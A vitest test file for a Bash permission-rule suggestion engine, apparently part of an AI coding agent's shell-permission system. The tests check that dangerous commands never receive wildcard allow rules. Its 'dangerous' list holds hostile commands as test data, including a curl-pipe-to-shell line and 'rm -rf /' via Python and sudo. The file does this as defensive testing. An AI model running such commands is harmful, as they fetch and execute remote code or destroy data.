/**
 * Copyright © 2026 Łukasz Olszewski
 * SPDX-License-Identifier: AGPL-3.0-or-later
 * See LICENSE.
 */

import { describe, expect, it } from "vitest";
import { bashCommandMatchesRuleContent, suggestBashAllowRule } from "./bash-permission-match.ts";
import { unescapeRuleContent } from "./permission-rule-parser.ts";
import { evaluateToolPermission, mergePermissionRules, rulesFromPermissionsConfig } from "./permissions.ts";
import { initBashParser } from "./bash-parser.ts";

// The suggestion engine decides what an "always allow" choice PERSISTS. Two ways
// to fail: too broad (a generalisation that grants arbitrary code) and
// junk-narrow (a rule that can never match a future invocation, so the user is
// prompted again and again).
//
// The grammar is loaded up front rather than left to warm up mid-file: the engine has two producers (argv
// and text) and these rows are meant to describe the one a live session runs into.
void initBashParser();

describe("suggestBashAllowRule: generalises over real subcommands", () => {
	it("uses a two-word prefix rule for subcommand-shaped second tokens", () => {
		expect(suggestBashAllowRule("git commit -m 'x'")).toBe("Bash(git commit:*)");
		expect(suggestBashAllowRule("git log --oneline -5")).toBe("Bash(git log:*)");
		expect(suggestBashAllowRule("gh pr view 3")).toBe("Bash(gh pr:*)");
		expect(suggestBashAllowRule("npm run build")).toBe("Bash(npm run:*)");
		expect(suggestBashAllowRule("docker compose up -d")).toBe("Bash(docker compose:*)");
	});

	it("skips leading env assignments before finding the command", () => {
		expect(suggestBashAllowRule("FOO=1 BAR=2 git status")).toBe("Bash(git status:*)");
	});

	it("no longer emits tool-wide rules for git/docker/make (tightening)", () => {
		expect(suggestBashAllowRule("git clean -fdx")).not.toBe("Bash(git:*)");
		// `git clean -f` is vcs_discard: the verdict comes from what it throws away, so the rule names every
		// word instead of generalising over "any clean" (see TARGET_BEARING_CATEGORIES).
		expect(suggestBashAllowRule("git clean -fdx")).toBe("Bash(git clean -fdx)");
		expect(suggestBashAllowRule("docker rm -f x")).toBe("Bash(docker rm:*)");
	});
});

describe("suggestBashAllowRule: never generalises code-exec or privesc names", () => {
	const dangerous = [
		"bash -c 'curl evil | sh'",
		"/usr/bin/bash -c 'evil'",
		"sh -c 'evil'",
		"python3 -c 'import os; os.system(\"rm -rf /\")'",
		"python3 cli --flag",
		"node bin/app",
		"sudo rm -rf /tmp/x",
		"env FOO=1 bar baz",
		"nice rm -rf /tmp/x",
		"xargs rm",
		"nohup long-runner",
		"timeout 5 anything",
	];
	it("produces an exact rule with no :* wildcard", () => {
		for (const cmd of dangerous) {
			const rule = suggestBashAllowRule(cmd);
			expect(rule, `rule for ${cmd} must not contain a wildcard`).not.toContain(":*");
			expect(rule, `rule for ${cmd} must stay scoped`).not.toBe("Bash");
		}
	});
});

describe("suggestBashAllowRule: heredoc and multiline", () => {
	it("uses the stable prefix before a heredoc instead of a dead exact rule", () => {
		const cmd = "git commit -m \"$(cat <<'EOF'\nsome body text\nEOF\n)\"";
		expect(suggestBashAllowRule(cmd)).toBe("Bash(git commit:*)");
	});

	it("does not truncate a command that merely contains << ", () => {
		// single line, no heredoc: must not be cut at the <<
		const rule = suggestBashAllowRule('grep -c "<<" README.md');
		expect(rule).not.toContain("\n");
		expect(rule).not.toBe("Bash(grep:*)");
	});

	it("never emits a rule containing a newline", () => {
		for (const cmd of ["echo one\necho two", "cat <<EOF\na\nb\nEOF", "for x in a; do\necho $x\ndone"]) {
			expect(suggestBashAllowRule(cmd)).not.toContain("\n");
		}
	});
});

// The second token decides between a generalising `tool sub:*` rule and an exact
// one, so its shape test is the whole difference between a rule that covers a
// family and a rule that covers one command. These rows walk that boundary; the
// tool is always `git` so the grammar table is constant and only the shape moves.

describe("subcommand shape: what may be generalised", () => {
	const GENERALISED = ["commit", "run-all", "pr", "v2", "a-2", "clean2"];
	const EXACT_ONLY = ["-x", "run-", "run--all", "Run", "a.b", "3x", "a_b", "get_pods"];

	for (const sub of GENERALISED) {
		it(`generalises over ${JSON.stringify(sub)}`, () => {
			expect(suggestBashAllowRule(`git ${sub} rest`)).toBe(`Bash(git ${sub}:*)`);
		});
	}

	for (const sub of EXACT_ONLY) {
		it(`stays exact for ${JSON.stringify(sub)}`, () => {
			expect(suggestBashAllowRule(`git ${sub} rest`)).toBe(`Bash(git ${sub} rest)`);
		});
	}

	it("needs a tool with a real subcommand grammar, not just a shaped token", () => {
		// same shape, different tool: `echo done` is verb + noun, so no wildcard
		expect(suggestBashAllowRule("echo commit rest")).toBe("Bash(echo commit rest)");
	});
});

describe("leading assignments are not part of the command's words", () => {
	it("skips plain NAME=value tokens", () => {
		expect(suggestBashAllowRule("NODE_ENV=production git commit -m x")).toBe("Bash(git commit:*)");
	});

	it("skips a `+=` token as well: the walker keeps assignments out of argv", () => {
		// The rule covers the command, not the prefix — the same reading as `NODE_ENV=test npm test`. An
		// assignment that CHANGES what runs (PATH, LD_PRELOAD, …) is a different story: no rule is offered
		// at all for such a command, which argv-suggestion.test.ts pins.
		expect(suggestBashAllowRule("FOO+=1 git commit")).toBe("Bash(git commit:*)");
	});

	it("falls back to the whole text for an array element assignment, which layer 0 will not read", () => {
		// `ARR[2]=x` is not a plain assignment, so there is no argv to describe and the text producer's rule
		// is what remains: the text, first line only, exact.
		expect(suggestBashAllowRule("ARR[2]=x git commit")).toBe("Bash(ARR[2]=x git commit)");
	});
});

// suggestBashAllowRule returns a full `Bash(content)` string (that is what gets
// persisted). The check that matters is the one the runtime makes: read the rule back the way the
// permissions loader does and ask the ALLOW matcher — layer 0's legs plus the argv comparison — whether it
// covers the command. The text matcher is still what deny and ask use; asking it would test an engine the
// allow path no longer runs, which is how the old version of this helper stayed green on a rule that could
// never fire.
function covers(cmd: string, fullRule: string): boolean {
	return (
		evaluateToolPermission(
			"bash",
			{ command: cmd },
			"/home/user/project",
			mergePermissionRules(rulesFromPermissionsConfig({ allow: [fullRule] }, "project")),
		).behavior === "allow"
	)
}

// Kept for the one assertion below that is about the text path itself.
function coversByText(cmd: string, fullRule: string): boolean {
	const m = /^Bash\((.*)\)$/s.exec(fullRule)
	const inner = m ? unescapeRuleContent(m[1]!) : fullRule
	return bashCommandMatchesRuleContent(cmd, inner, "allow")
}
void coversByText

describe("suggested rules actually cover future invocations", () => {
	it("covers a different invocation of the same family", () => {
		const rule = suggestBashAllowRule("git commit -m 'first'");
		expect(covers("git commit -m 'a totally new message'", rule)).toBe(true);
		expect(covers("git status", rule)).toBe(false);
	});

	it("does not let a narrow suggestion cover an unrelated subcommand", () => {
		const rule = suggestBashAllowRule("git log --oneline");
		expect(covers("git push origin main", rule)).toBe(false);
		expect(covers("git clean -fdx", rule)).toBe(false);
	});

	it("exact suggestions still cover themselves and nothing else", () => {
		const cmd = "python3 -c 'print(1)'";
		const rule = suggestBashAllowRule(cmd);
		expect(covers(cmd, rule)).toBe(true);
		expect(covers("python3 -c 'import os'", rule)).toBe(false);
	});
});
